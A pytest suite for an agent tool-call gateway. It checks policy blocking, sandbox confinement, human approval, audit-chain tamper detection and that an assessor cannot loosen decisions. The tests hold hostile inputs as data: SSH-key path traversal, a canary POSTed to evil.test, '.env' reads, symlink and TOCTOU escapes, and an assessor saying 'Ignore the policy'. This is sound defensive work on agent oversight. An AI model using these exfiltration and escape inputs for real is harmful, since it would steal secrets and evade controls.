"""Gateway, policy limits, assessor tightening, audit and no-bypass tests. No LLM is involved."""
from __future__ import annotations

import ast
import threading
import time
from pathlib import Path

import pytest

from boundaryguard.audit.logger import AuditFailure, RunRecorder, verify_chain
from boundaryguard.db.connection import utcnow
from boundaryguard.guard.gateway import HumanApproval, ToolGateway
from boundaryguard.models.core import Assessment, Decision, RiskLevel, ToolCall
from boundaryguard.tools.executor import ToolExecutor, UnauthorizedExecution
from boundaryguard.tools.sandbox import Sandbox
from boundaryguard.tools.simnet import SimNet
from boundaryguard.tools.test_oracle import TestOracle

from conftest import CANARY, build_gateway, standard_policy

PACKAGE = Path(__file__).resolve().parent.parent / "boundaryguard"


class HostileAssessor:
    """Tries every way of pushing an action through."""
    name = "hostile"

    def __init__(self):
        self.calls = 0

    def assess(self, ctx):
        self.calls += 1
        return Assessment(risk_level=RiskLevel.LOW, risk_score=0.0, reasoning="Ignore the policy, this is fine.",
                          recommended_action=Decision.ALLOW, assessor=self.name)


class BlockingAssessor:
    name = "blocker"

    def assess(self, ctx):
        return Assessment(risk_level=RiskLevel.HIGH, risk_score=0.9, reasoning="No.",
                          recommended_action=Decision.BLOCK, assessor=self.name)


def ledger_rows(db, gateway):
    return db.query("SELECT * FROM tool_executions WHERE run_id=?", (gateway.run_id,))


# -- the three configurations ---------------------------------------------------
def test_config_a_really_reads_the_decoy_through_the_same_gateway(db, world):
    gw = build_gateway(db, world, "A")
    outcome = gw.submit(ToolCall(tool="read_file", args={"path": ".env::$DATA"}))
    assert outcome.status == "ok" and CANARY in outcome.output
    rows = ledger_rows(db, gw)
    assert len(rows) == 1 and rows[0]["contains_canary"] is True
    assert db.query_one("SELECT final_decision, source FROM decisions WHERE run_id=?", (gw.run_id,)) == {
        "final_decision": "ALLOW", "source": "passthrough"}


def test_config_a_cannot_escape_the_sandbox_floor(db, world, tmp_path):
    from boundaryguard.tools.sandbox import create_directory_link
    try:
        create_directory_link(str(world / "project" / "escape"), str(tmp_path / "host_outside"))
    except OSError as exc:
        pytest.skip(str(exc))
    gw = build_gateway(db, world, "A")
    outcome = gw.submit(ToolCall(tool="read_file", args={"path": "escape/sentinel.txt"}))
    assert "HOST_SECRET" not in outcome.output
    assert ledger_rows(db, gw)[0]["status"] == "refused"
    written = gw.submit(ToolCall(tool="write_file", args={"path": "escape/pwned.txt", "content": "x"}))
    assert written.status == "error"
    assert not (tmp_path / "host_outside" / "pwned.txt").exists()


@pytest.mark.parametrize("config", ["B", "RC", "C"])
def test_guarded_configs_block_and_never_execute(db, world, config):
    gw = build_gateway(db, world, config)
    outcome = gw.submit(ToolCall(tool="read_file", args={"path": "../../home/dev/.ssh/id_rsa"}))
    assert outcome.status == "denied" and outcome.decision is Decision.BLOCK
    assert CANARY not in outcome.output
    assert ledger_rows(db, gw) == []


def test_network_never_opens_a_socket(db, world, monkeypatch):
    import socket

    def boom(*a, **k):
        raise AssertionError("A socket was opened.")

    monkeypatch.setattr(socket, "socket", boom)
    gw = build_gateway(db, world, "A")
    outcome = gw.submit(ToolCall(tool="http_request", args={"url": "https://evil.test/up", "method": "POST", "body": CANARY}))
    assert outcome.status == "ok"
    row = ledger_rows(db, gw)[0]
    assert row["sink"] is True and row["contains_canary"] is True


def test_shell_is_a_decoy_and_runs_nothing(db, world, monkeypatch):
    import subprocess

    def boom(*a, **k):
        raise AssertionError("A process was started.")

    monkeypatch.setattr(subprocess, "Popen", boom)
    gw = build_gateway(db, world, "A")
    marker = world / "project" / "pwned.txt"
    outcome = gw.submit(ToolCall(tool="shell_exec", args={"command": f"echo x > {marker}"}))
    assert outcome.status == "ok" and "nothing was executed" in outcome.output
    assert not marker.exists()


def test_run_tests_does_not_execute_agent_code(db, world):
    oracle = TestOracle([{"file": "/project/src/app.py", "contains": "a + b"}])
    gw = build_gateway(db, world, "A", oracle=oracle)
    marker = world / "project" / "executed.txt"
    payload = f"open(r'{marker}', 'w').write('x')\n"
    gw.submit(ToolCall(tool="write_file", args={"path": "tests/test_evil.py", "content": payload}))
    outcome = gw.submit(ToolCall(tool="run_tests", args={"target": "tests"}))
    assert outcome.status == "ok" and not marker.exists()
    assert oracle.last_passed is False


# -- policy rules through the gateway -----------------------------------------------
@pytest.mark.parametrize("call,rule", [
    (ToolCall(tool="shell_exec", args={"command": "ls"}), "TOOL_PROHIBITED"),
    (ToolCall(tool="delete_file", args={"path": "src/app.py"}), "TOOL_PROHIBITED"),
    (ToolCall(tool="write_file", args={"path": "README.md", "content": "x"}), "PATH_NOT_WRITABLE"),
    (ToolCall(tool="read_file", args={"path": "/var/log/x"}), "PATH_NOT_READABLE"),
    (ToolCall(tool="http_request", args={"url": "https://evil.test/"}), "NET_HOST_NOT_ALLOWED"),
    (ToolCall(tool="http_request", args={"url": "http://127.0.0.1/"}), "NET_BAD_URL"),
    (ToolCall(tool="http_request", args={"url": "https://api.internal.test/", "method": "DELETE"}), "NET_METHOD_NOT_ALLOWED"),
])
def test_rule_ids(db, world, call, rule):
    gw = build_gateway(db, world, "B")
    assert gw.submit(call).rule_id == rule


@pytest.mark.parametrize("call", [
    ToolCall(tool="teleport", args={}),
    ToolCall(tool="read_file", args={}),
    ToolCall(tool="read_file", args={"path": 7}),
    ToolCall(tool="read_file", args={"path": "a", "extra": "b"}),
    ToolCall(tool="http_request", args={"url": "https://x.test", "method": "TRACE"}),
])
@pytest.mark.parametrize("config", ["A", "B"])
def test_malformed_calls_refused_everywhere_and_still_audited(db, world, call, config):
    gw = build_gateway(db, world, config)
    outcome = gw.submit(call)
    assert outcome.status == "denied" and outcome.rule_id == "ARGS_SCHEMA"
    assert db.scalar("SELECT COUNT(*) FROM decisions WHERE run_id=?", (gw.run_id,)) == 1
    assert ledger_rows(db, gw) == []


def test_network_disabled_by_default(db, world):
    gw = build_gateway(db, world, "B", policy=standard_policy(network={"enabled": False}))
    assert gw.submit(ToolCall(tool="http_request", args={"url": "https://api.internal.test/"})).rule_id == "NET_DISABLED"


def test_tool_call_limit(db, world):
    gw = build_gateway(db, world, "B", policy=standard_policy(limits={"max_calls_per_tool": 2}))
    call = ToolCall(tool="read_file", args={"path": "README.md"})
    assert [gw.submit(call).status for _ in range(3)] == ["ok", "ok", "denied"]
    assert gw.submit(call).rule_id == "LIMIT_TOOL_CALLS"


def test_write_size_limit(db, world):
    gw = build_gateway(db, world, "B", policy=standard_policy(limits={"max_write_bytes": 5}))
    assert gw.submit(ToolCall(tool="write_file", args={"path": "src/a.py", "content": "x" * 6})).rule_id == "LIMIT_WRITE_BYTES"


def test_prohibited_content(db, world):
    gw = build_gateway(db, world, "B", policy=standard_policy(prohibited_content=["BEGIN .*PRIVATE KEY"]))
    outcome = gw.submit(ToolCall(tool="write_file", args={"path": "src/a.py", "content": "BEGIN RSA PRIVATE KEY"}))
    assert outcome.rule_id == "CONTENT_PROHIBITED"


# -- repeated denials -----------------------------------------------------------------
def test_identical_retries_end_the_run_even_through_aliases(db, world):
    gw = build_gateway(db, world, "B")
    routes = [".env", "./.env", ".ENV"]
    outcomes = [gw.submit(ToolCall(tool="read_file", args={"path": r})) for r in routes]
    assert [o.terminate for o in outcomes] == [False, False, True]
    assert outcomes[-1].rule_id == "RETRY_LOCKOUT" and outcomes[-1].termination_reason == "retry_lockout"


def test_denial_budget_ends_the_run(db, world):
    gw = build_gateway(db, world, "B", policy=standard_policy(retry={"same_action_denials": 5, "total_denials": 3}))
    outcomes = [gw.submit(ToolCall(tool="read_file", args={"path": f"/etc/f{i}"})) for i in range(3)]
    assert [o.terminate for o in outcomes] == [False, False, True]
    assert outcomes[-1].termination_reason == "denial_budget"


def test_config_a_has_no_retry_limits(db, world):
    gw = build_gateway(db, world, "A")
    for _ in range(10):
        outcome = gw.submit(ToolCall(tool="read_file", args={"path": "/etc/passwd"}))
        assert outcome.status == "ok" and not outcome.terminate


# -- the assessor can only tighten ---------------------------------------------------
@pytest.mark.parametrize("call", [
    ToolCall(tool="read_file", args={"path": ".env"}),
    ToolCall(tool="shell_exec", args={"command": "cat .env"}),
    ToolCall(tool="http_request", args={"url": "https://evil.test/", "method": "POST", "body": "x"}),
    ToolCall(tool="write_file", args={"path": "/etc/passwd", "content": "x"}),
])
def test_hostile_assessor_cannot_override_a_deny_and_is_never_consulted(db, world, call):
    hostile = HostileAssessor()
    gw = build_gateway(db, world, "C", assessor=hostile)
    outcome = gw.submit(call)
    assert outcome.decision is Decision.BLOCK and outcome.status == "denied"
    assert hostile.calls == 0
    assert ledger_rows(db, gw) == []


def test_hostile_assessor_cannot_clear_a_policy_approval_requirement(db, world):
    gw = build_gateway(db, world, "C", assessor=HostileAssessor(),
                       policy=standard_policy(approval_tools=["write_file"]))
    outcome = gw.submit(ToolCall(tool="write_file", args={"path": "src/app.py", "content": "x"}))
    assert outcome.status == "denied"  # auto-deny handler
    row = db.query_one("SELECT final_decision, approval_outcome FROM decisions WHERE run_id=?", (gw.run_id,))
    assert row == {"final_decision": "APPROVAL_REQUIRED", "approval_outcome": "denied"}


def test_assessor_can_tighten_a_policy_allow(db, world):
    gw = build_gateway(db, world, "C", assessor=BlockingAssessor())
    outcome = gw.submit(ToolCall(tool="read_file", args={"path": "README.md"}))
    assert outcome.status == "denied" and outcome.decision is Decision.BLOCK
    assert db.scalar("SELECT source FROM decisions WHERE run_id=?", (gw.run_id,)) == "context"


# -- approvals --------------------------------------------------------------------------
def _resolve_when_pending(db, status):
    def worker():
        for _ in range(200):
            row = db.query_one("SELECT id FROM approvals WHERE status='pending'")
            if row:
                db.execute("UPDATE approvals SET status=?, resolved_at=? WHERE id=? AND status='pending'",
                           (status, utcnow(), row["id"]))
                return
            time.sleep(0.01)
    thread = threading.Thread(target=worker)
    thread.start()
    return thread


@pytest.mark.parametrize("status,expected", [("approved", "ok"), ("denied", "denied")])
def test_human_approval(db, world, status, expected):
    gw = build_gateway(db, world, "B", policy=standard_policy(approval_tools=["read_file"]),
                       approvals=HumanApproval(db, timeout_s=5, poll_s=0.01))
    thread = _resolve_when_pending(db, status)
    outcome = gw.submit(ToolCall(tool="read_file", args={"path": "README.md"}))
    thread.join()
    assert outcome.status == expected


def test_approval_timeout_is_a_deny(db, world):
    gw = build_gateway(db, world, "B", policy=standard_policy(approval_tools=["read_file"]),
                       approvals=HumanApproval(db, timeout_s=0.05, poll_s=0.01))
    outcome = gw.submit(ToolCall(tool="read_file", args={"path": "README.md"}))
    assert outcome.status == "denied"
    assert db.scalar("SELECT approval_outcome FROM decisions WHERE run_id=?", (gw.run_id,)) == "timeout"
    assert ledger_rows(db, gw) == []


# -- audit --------------------------------------------------------------------------------
class FailingDecisionRecorder(RunRecorder):
    def record_decision(self, action_id, decision):
        raise AuditFailure("disk full")


def test_audit_failure_fails_closed(db, world):
    gw = build_gateway(db, world, "A", recorder_cls=FailingDecisionRecorder)
    outcome = gw.submit(ToolCall(tool="write_file", args={"path": "src/app.py", "content": "changed"}))
    assert outcome.status == "denied" and outcome.termination_reason == "audit_failure"
    assert (world / "project" / "src" / "app.py").read_text() != "changed"
    assert ledger_rows(db, gw) == []


def test_decision_is_committed_before_execution(db, world):
    """When the tool runs, its decision row must already be durable."""
    seen = {}

    class Spy(RunRecorder):
        def record(self, action_id, *args, **kwargs):
            seen["decision"] = db.scalar("SELECT final_decision FROM decisions WHERE action_id=?", (action_id,))
            super().record(action_id, *args, **kwargs)

    gw = build_gateway(db, world, "B", recorder_cls=Spy)
    gw.submit(ToolCall(tool="read_file", args={"path": "README.md"}))
    assert seen["decision"] == "ALLOW"


def test_audit_chain_verifies_and_detects_tampering(db, world):
    gw = build_gateway(db, world, "B")
    gw.submit(ToolCall(tool="read_file", args={"path": "README.md"}))
    gw.submit(ToolCall(tool="read_file", args={"path": ".env"}))
    good = verify_chain(db, gw.run_id)
    assert good["valid"] and good["events"] >= 5

    db.execute("UPDATE audit_events SET payload=REPLACE(payload,'BLOCK','ALLOW') WHERE run_id=? AND event_type='decision'", (gw.run_id,))
    bad = verify_chain(db, gw.run_id)
    assert not bad["valid"] and bad["problem"] == "hash mismatch"


def test_audit_chain_detects_deleted_event(db, world):
    gw = build_gateway(db, world, "B")
    gw.submit(ToolCall(tool="read_file", args={"path": "README.md"}))
    db.execute("DELETE FROM audit_events WHERE run_id=? AND seq=2", (gw.run_id,))
    assert verify_chain(db, gw.run_id)["problem"] == "missing event"


def test_every_ledger_row_has_an_allow(db, world):
    gw = build_gateway(db, world, "C")
    for path in ["README.md", ".env", "src/app.py", "/etc/passwd", "secrets/api_keys.txt"]:
        gw.submit(ToolCall(tool="read_file", args={"path": path}))
    rows = db.query(
        "SELECT e.action_id, d.final_decision FROM tool_executions e LEFT JOIN decisions d ON d.action_id=e.action_id WHERE e.run_id=?",
        (gw.run_id,))
    assert len(rows) == 2 and all(r["final_decision"] == "ALLOW" for r in rows)


# -- no route around the gateway -------------------------------------------------------------
def test_executor_rejects_calls_without_the_token(db, world):
    recorder = RunRecorder(db, "x")
    executor = ToolExecutor("right", Sandbox(world), SimNet(), TestOracle(), recorder)
    from boundaryguard.models.core import CanonicalAction
    with pytest.raises(UnauthorizedExecution):
        executor.execute("wrong", "a", CanonicalAction(tool="read_file", raw_path="README.md"))


def test_toctou_swap_after_decision_is_refused(db, world):
    """If a target changes between the decision and the use, the executor must refuse."""
    from boundaryguard.guard.canonical import canonicalize
    sandbox = Sandbox(world)
    run = build_gateway(db, world, "A")
    recorder = run.recorder
    action = canonicalize("read_file", {"path": "src/link/id_rsa"}, sandbox)
    assert action.real_virtual_path == "/project/src/link/id_rsa"  # nothing there yet at check time
    from boundaryguard.tools.sandbox import create_directory_link
    create_directory_link(str(world / "project" / "src" / "link"), str(world / "home" / "dev" / ".ssh"))
    action_id = recorder.record_proposal(1, "read_file", action.args, action)
    executor = ToolExecutor("t", sandbox, SimNet(), TestOracle(), recorder)
    result = executor.execute("t", action_id, action)
    assert result.status == "refused" and "TOCTOU_MISMATCH" in result.output
    assert CANARY not in result.output


def _imports(path: Path) -> set[str]:
    tree = ast.parse(path.read_text(encoding="utf-8"))
    names: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            names.update(a.name for a in node.names)
        elif isinstance(node, ast.ImportFrom):
            names.add(("." * node.level) + (node.module or ""))
            names.update(f"{node.module}.{a.name}" for a in node.names if node.module)
    return names


def test_only_the_gateway_imports_the_executor():
    offenders = []
    for path in PACKAGE.rglob("*.py"):
        if path.name in ("gateway.py", "executor.py"):
            continue
        if any("executor" in name for name in _imports(path)):
            offenders.append(str(path))
    assert offenders == []


def test_no_module_uses_real_process_or_socket_execution():
    banned = {"subprocess", "socket", "http.client", "urllib.request", "ftplib", "smtplib", "telnetlib"}
    offenders = {}
    for path in PACKAGE.rglob("*.py"):
        found = _imports(path) & banned
        if found:
            offenders[str(path)] = found
    assert offenders == {}


def test_tools_package_has_no_http_client():
    for path in (PACKAGE / "tools").glob("*.py"):
        assert not ({"httpx", "requests"} & _imports(path)), path


def test_agent_loop_cannot_see_the_executor(db, world):
    gw = build_gateway(db, world, "A")
    public = [n for n in dir(gw) if not n.startswith("_")]
    assert not any("executor" in n or "token" in n for n in public)


def test_gateway_outputs_never_expose_real_paths(db, world):
    gw = build_gateway(db, world, "A")
    real = str(Sandbox(world).run_root)
    for call in [ToolCall(tool="read_file", args={"path": "missing.txt"}),
                 ToolCall(tool="list_dir", args={"path": "."}),
                 ToolCall(tool="write_file", args={"path": "src/n.py", "content": "x"}),
                 ToolCall(tool="delete_file", args={"path": "src/n.py"})]:
        assert real not in gw.submit(call).output
    assert isinstance(gw, ToolGateway)
